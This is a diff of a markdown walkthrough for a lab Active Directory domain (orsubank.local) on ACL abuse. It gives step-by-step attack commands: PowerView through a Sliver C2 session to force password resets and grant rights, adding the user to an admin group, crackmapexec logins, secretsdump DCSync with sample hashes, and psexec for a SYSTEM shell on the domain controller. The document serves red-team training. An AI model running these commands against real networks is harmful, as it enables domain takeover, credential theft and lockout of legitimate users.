@@ -255,9 +255,9 @@ cd C:\AD-RTO\lab-config\server
 
 | Who | Permission | On Whom | Attack Path |
 |-----|-----------|----------|-------------|
-| vamsi.krishna | GenericAll | lakshmi.devi | Reset password → DA |
-| pranavi | WriteDACL | Domain Object | Grant DCSync → Dump all hashes |
-| kiran.kumar | ForceChangePassword | harsha.vardhan | Change password → Escalate |
+| vamsi.krishna | GenericAll | lakshmi.devi | Reset password, impersonate admin |
+| vamsi.krishna | WriteDACL | IT_Admins group | Add self to IT_Admins → Domain Admin |
+| divya | ForceChangePassword | ammulu.orsu (DA) | Force reset DA password → Login as DA |
 
 ---
 
@@ -349,7 +349,7 @@ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/
 
 **Using PowerView:**
 ```bash
-[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); $pass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force; Set-DomainUserPassword -Identity lakshmi.devi -AccountPassword $pass"
+[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); $pass = ConvertTo-SecureString 'HackedPassword1!' -AsPlainText -Force; Set-DomainUserPassword -Identity lakshmi.devi -AccountPassword $pass"
 ```
 
 **What this does:**
@@ -366,7 +366,7 @@ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/
 
 **From Kali:**
 ```bash
-crackmapexec smb DC01.orsubank.local -u lakshmi.devi -p 'NewPassword123!' -d orsubank.local
+crackmapexec smb DC01.orsubank.local -u lakshmi.devi -p 'HackedPassword1!' -d orsubank.local
 ```
 
 **Expected:**
@@ -405,81 +405,158 @@ net rpc group members "Domain Admins" -U "orsubank.local/lakshmi.devi%NewPasswor
 
 # 📖 PART 6: Exploiting WriteDACL
 
-**Scenario:** You have WriteDACL on the Domain object
+**Scenario:** You have WriteDACL on the IT_Admins group
 
 ## 6.1: Understand the Goal
 
-WriteDACL lets you modify permissions.
+WriteDACL lets you modify permissions on an object.
 
-**Attack:**
-1. Grant yourself **DCSync** rights
-2. Use DCSync to dump all domain hashes
-3. You have krbtgt → Golden Ticket!
+**Lab Setup:**
+- You (vamsi.krishna) have WriteDACL on **IT_Admins** group
+- IT_Admins is a member of **Domain Admins**
+
+**Attack Path:**
+1. Grant yourself **GenericWrite** on IT_Admins (using WriteDACL)
+2. Add yourself to IT_Admins group
+3. IT_Admins → Domain Admins = You are now DA!
 
 ---
 
-## 6.2: Grant DCSync Rights
+## 6.2: Grant Yourself GenericWrite on IT_Admins
 
 **Using PowerView:**
 ```bash
-[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); Add-DomainObjectAcl -TargetIdentity 'DC=orsubank,DC=local' -PrincipalIdentity vamsi.krishna -Rights DCSync"
+[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); Add-DomainObjectAcl -TargetIdentity 'IT_Admins' -PrincipalIdentity vamsi.krishna -Rights GenericWrite"
 ```
 
 **What this does:**
 - `Add-DomainObjectAcl` = Add an ACE to an object's ACL
-- `-TargetIdentity 'DC=orsubank,DC=local'` = The domain object
+- `-TargetIdentity 'IT_Admins'` = The IT_Admins group
 - `-PrincipalIdentity vamsi.krishna` = Who to grant rights to (yourself!)
-- `-Rights DCSync` = The specific rights (replication rights)
+- `-Rights GenericWrite` = Ability to write properties including group membership
 
 ---
 
-## 6.3: Perform DCSync
+## 6.3: Add Yourself to IT_Admins Group
 
-**Now you can DCSync:**
+**Now add yourself to the group:**
 ```bash
-secretsdump.py orsubank.local/vamsi.krishna:'Password123!'@DC01.orsubank.local
+[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "Add-ADGroupMember -Identity 'IT_Admins' -Members 'vamsi.krishna'"
 ```
 
-**You'll get ALL domain hashes:**
+**Or using net command:**
+```bash
+[server] sliver (ORSUBANK_WS01) > execute -o cmd.exe /c "net group IT_Admins vamsi.krishna /add /domain"
 ```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
-lakshmi.devi:1104:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+---
+
+## 6.4: Verify Domain Admin Access
+
+**Check your groups:**
+```bash
+[server] sliver (ORSUBANK_WS01) > execute -o cmd.exe /c "whoami /groups"
+```
+
+**You should see:**
+```
+ORSUBANK\IT_Admins
+ORSUBANK\Domain Admins  ? Through IT_Admins membership!
+```
+
+**Test DA access:**
+```bash
+crackmapexec smb DC01.orsubank.local -u vamsi.krishna -p 'Password123!' -d orsubank.local
+```
+
+**Expected:**
+```
+SMB   DC01.orsubank.local   445   DC01   [+] orsubank.local\vamsi.krishna:Password123! (Pwn3d!)
 ```
 
 **You are now Domain Admin!**
 
 ---
 
+### 6.5: Alternative - DCSync Rights (Advanced)
+
+**Note:** The lab creates WriteDACL on IT_Admins group. However, WriteDACL can also be exploited on the **Domain object** itself to grant DCSync rights.
+
+**If you had WriteDACL on the Domain:**
+```bash
+Add-DomainObjectAcl -TargetIdentity 'DC=orsubank,DC=local' -PrincipalIdentity vamsi.krishna -Rights DCSync
+secretsdump.py orsubank.local/vamsi.krishna:'Password123!'@DC01.orsubank.local
+```
+
+This is covered in **[Walkthrough 04b: DCSync Attack](./04b_dcsync_attack.md)**.
+
+---
+
 # 📖 PART 7: Exploiting ForceChangePassword
 
-**Scenario:** You have ForceChangePassword on `harsha.vardhan`
+**Scenario:** You have compromised divya who has ForceChangePassword on ammulu.orsu (Domain Admin)
 
-## 7.1: Change the Password
+## 7.1: Understanding the Setup
+
+**Lab Configuration:**
+- **divya** has ForceChangePassword extended right on **ammulu.orsu**
+- **ammulu.orsu** is a member of **Domain Admins**
+- ForceChangePassword allows resetting password WITHOUT knowing the current one
+
+**Attack Path:**
+1. Compromise or login as divya
+2. Force reset ammulu.orsu's password
+3. Login as ammulu.orsu
+4. You are now Domain Admin!
+
+---
+
+## 7.2: Change ammulu.orsu's Password
 
 **Using PowerView:**
 ```bash
-[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); $pass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force; Set-DomainUserPassword -Identity harsha.vardhan -AccountPassword $pass"
+[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "IEX(Get-Content C:\Windows\Temp\PowerView.ps1 -Raw); $pass = ConvertTo-SecureString 'HackedPassword1!' -AsPlainText -Force; Set-DomainUserPassword -Identity ammulu.orsu -AccountPassword $pass"
 ```
+
+**What this does:**
+- `ConvertTo-SecureString` = Convert plain password to secure format
+- `Set-DomainUserPassword` = PowerView function to reset password
+- `-Identity ammulu.orsu` = Target Domain Admin user
+- `-AccountPassword $pass` = New password (HackedPassword1!)
+
+**Result:** ammulu.orsu's password is now `HackedPassword1!`
 
 ---
 
-## 7.2: Login as harsha.vardhan
+## 7.3: Login as ammulu.orsu (Domain Admin)
 
+**From Kali:**
 ```bash
-crackmapexec smb DC01.orsubank.local -u harsha.vardhan -p 'NewPassword123!' -d orsubank.local
+crackmapexec smb DC01.orsubank.local -u ammulu.orsu -p 'HackedPassword1!' -d orsubank.local
+```
+
+**Expected:**
+```
+SMB   DC01.orsubank.local   445   DC01   [+] orsubank.local\ammulu.orsu:HackedPassword1! (Pwn3d!)
 ```
 
 ---
 
-## 7.3: Follow the Path
+## 7.4: Verify Domain Admin Rights
 
-Remember from Enable-DomainAdminPath.ps1:
-```
-harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → Domain Admins
+**Check ammulu.orsu's groups:**
+```bash
+net rpc group members "Domain Admins" -U "orsubank.local/ammulu.orsu%HackedPassword1!" -S DC01.orsubank.local
 ```
 
-**You are effectively Domain Admin through nested groups!**
+**You'll see ammulu.orsu is a member!**
+
+**Get a shell on DC:**
+```bash
+psexec.py orsubank.local/ammulu.orsu:'HackedPassword1!'@DC01.orsubank.local
+```
+
+**You are now SYSTEM on the Domain Controller!**
 
 ---
 
@@ -624,3 +701,6 @@ The challenge is the high volume of legitimate ACL operations, requiring baselin
 **Interview Importance:** ⭐⭐⭐⭐⭐ (ACL abuse is critical for advanced AD interviews)
 
 ---
+
+
+
